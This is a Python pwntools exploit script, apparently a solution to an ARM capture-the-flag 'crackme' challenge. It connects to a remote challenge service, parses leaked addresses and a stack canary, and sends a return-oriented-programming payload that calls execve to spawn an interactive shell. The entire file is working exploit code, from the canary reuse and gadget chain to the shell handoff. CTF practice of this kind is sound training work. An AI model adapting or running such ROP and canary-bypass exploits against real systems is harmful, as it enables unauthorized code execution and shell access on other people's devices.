from pwn import context, remote, ELF, ROP, log
import pwnlib.util.packing
import code

# def p8(x): return pwnlib.util.packing.pack(x, 8, sign=False)
# def p16(x): return pwnlib.util.packing.pack(x, 16, sign=False)


def p32(x): return pwnlib.util.packing.pack(x, 32, sign=False)
def p64(x): return pwnlib.util.packing.pack(x, 64, sign=False)


context(arch='arm', log_level='DEBUG')

binary = ELF("./crackme/02_harmrop/camera_app")
binary_gadgets = ROP(binary)

printf_plt = binary.plt['printf']   # 0x1450
execve_plt = binary.plt['execve']   # 0x1460
_ = binary.plt['__stack_chk_fail']  # 0x1470
puts_plt = binary.plt['puts']       # 0x1480

printf_got = binary.got['printf']   # 0x2118
execve_got = binary.got['execve']   # 0x211c
puts_got = binary.got['puts']       # 0x2124

gift_binaddr = 0x1154
printf_binaddr = 0x116c
execve_binaddr = 0x1178
execve_nor0_binaddr = 0x117c
addr0pc_binaddr = 0x1184
popr0_binaddr = 0x1194
subsp_binaddr = 0x1198
binls_binaddr = next(binary.search(b'/bin/ls'))  # 0x6a5


LEN = 0x20

conn = remote("47.99.80.189", 10002)

conn.recvuntil("The addr of hear is: ")
hear_addr = int(conn.recv(10).strip(), 0)
conn.recvuntil("The addr of gift is: ")
gift_addr = int(conn.recv(10).strip(), 0)
conn.recvuntil("The addr of execve is: ")
execve_addr = int(conn.recv(10).strip(), 0)
conn.recvuntil("The addr of stack is ")
stack_addr = int(conn.recv(10).strip(), 0)

conn.recvuntil("[?] Are you smiling right now? (y/n)")

conn.sendline('y')

conn.recvuntil("[!] here is a gift for smiling: ")
canary = int(conn.recv(10).strip(), 16)

conn.recvuntil("[ ] Now Reading:")

'''
Stage 2
'''

sp = stack_addr - 0x40

gift_offset = gift_addr - gift_binaddr

payload = b"/bin/shell".ljust(0x18, b'\0')
payload += p32(gift_offset + popr0_binaddr)
payload += p32(sp+4 - (gift_offset + addr0pc_binaddr))  # r0 of execve
payload += p32(canary)
payload += p32(gift_offset + subsp_binaddr)        # r4 = second subsq
payload += p32(gift_offset + execve_nor0_binaddr)  # sl = execve_nor0
payload += p32(sp + 0x30)                          # correct fp
payload += p32(gift_offset + subsp_binaddr)        # lr = first subsp

log.debug("len of payload is 0x%x" % len(payload))

conn.sendline(payload)

conn.interactive()

# code.interact(local=locals())
